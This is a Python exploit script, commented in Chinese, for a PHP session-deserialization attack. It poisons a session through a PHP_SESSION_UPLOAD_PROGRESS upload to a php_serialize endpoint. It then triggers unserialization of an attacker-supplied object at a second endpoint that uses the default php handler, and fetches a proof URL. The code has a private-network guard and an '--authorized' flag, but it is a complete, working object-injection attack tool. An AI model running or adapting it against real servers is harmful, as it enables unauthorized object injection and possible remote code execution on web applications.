#!/usr/bin/env python3
"""跨 handler 对象注入链：投毒(php_serialize 写) -> 触发(php 读) -> 取证明。

仅用于自有/已授权靶标。默认只允许私网目标，公网需 --authorized。
"""
import argparse, csv, ipaddress, socket, ssl, sys, time, urllib.error, urllib.request, uuid

UA = "Mozilla/5.0 (compatible; inject-chain/1.0)"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def private(host):
    try:
        for fam, _, _, _, sa in socket.getaddrinfo(host, None):
            ip = ipaddress.ip_address(sa[0])
            if not (ip.is_private or ip.is_loopback or ip.is_link_local):
                return False
        return True
    except OSError:
        return False

def multipart(name, filename="a.txt"):
    b = "----" + uuid.uuid4().hex[:12]
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{name}\r\n"
            f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{filename}\"\r\n"
            f"Content-Type: text/plain\r\n\r\nAB\r\n--{b}--\r\n")
    return body.encode(), b

def post(url, name, sid, timeout=10):
    body, b = multipart(name)
    req = urllib.request.Request(url, data=body, method="POST", headers={
        "User-Agent": UA, "Content-Type": f"multipart/form-data; boundary={b}",
        "Cookie": f"PHPSESSID={sid}"})
    t0 = time.time()
    try:
        with urllib.request.urlopen(req, timeout=timeout, context=CTX) as r:
            return r.status, r.read(256), (time.time()-t0)*1000
    except urllib.error.HTTPError as e:
        return e.code, b"", (time.time()-t0)*1000
    except Exception as e:
        return 0, str(e)[:80].encode(), (time.time()-t0)*1000

def get(url, timeout=10):
    try:
        with urllib.request.urlopen(urllib.request.Request(url, headers={"User-Agent": UA}),
                                    timeout=timeout, context=CTX) as r:
            return r.status, r.read(2048)
    except urllib.error.HTTPError as e:
        return e.code, b""
    except Exception:
        return 0, b""

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--poison-url", required=True, help="走 php_serialize 的写入点（如 /pz/up.php）")
    ap.add_argument("--trigger-url", required=True, help="走默认 php 的触发点（如 /hello.php）")
    ap.add_argument("--object", required=True, help='序列化对象，如 O:6:"PrePwn":1:{s:1:"a";s:1:"b";}')
    ap.add_argument("--sid", default="inj" + uuid.uuid4().hex[:12])
    ap.add_argument("--proof-url", default="", help="触发后访问该 URL 取证明")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--timeout", type=float, default=10)
    a = ap.parse_args()

    for u in (a.poison_url, a.trigger_url):
        h = urllib.parse.urlparse(u).hostname
        if not a.authorized and not private(h):
            sys.exit(f"[!] {h} 不在私网范围；确认授权后加 --authorized")

    # 投毒：name = "x|<object>"，php_serialize 会把它作为 JSON/序列化字符串写入
    st1, _, ms1 = post(a.poison_url, "x|" + a.object, a.sid, a.timeout)
    print(f"[1] poison {a.poison_url} -> {st1} ({ms1:.0f}ms)")
    time.sleep(0.3)

    # 触发：默认 php handler 在第一个 '|' 处切开并 unserialize 后半段
    st2, _, ms2 = post(a.trigger_url, "z", a.sid, a.timeout)
    print(f"[2] trigger {a.trigger_url} -> {st2} ({ms2:.0f}ms)")
    time.sleep(0.5)

    if a.proof_url:
        st3, body = get(a.proof_url, a.timeout)
        print(f"[3] proof {a.proof_url} -> {st3} {body[:120]!r}")
    print(f"[*] sid={a.sid}")

if __name__ == "__main__":
    import urllib.parse
    main()
